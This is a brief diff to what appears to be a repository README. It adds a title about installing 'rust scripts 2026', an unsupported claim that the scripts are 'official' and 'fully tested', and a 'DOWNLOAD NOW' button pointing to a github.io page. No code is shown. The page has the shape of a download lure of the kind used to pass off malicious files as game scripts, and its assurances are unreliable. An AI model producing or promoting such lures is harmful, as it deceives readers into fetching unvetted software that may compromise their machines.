@@ -1,10 +1,10 @@
-
+# how to install rust scripts 2026. Our official rust scripts are fully tested and ready for use.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://rust-ih20.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
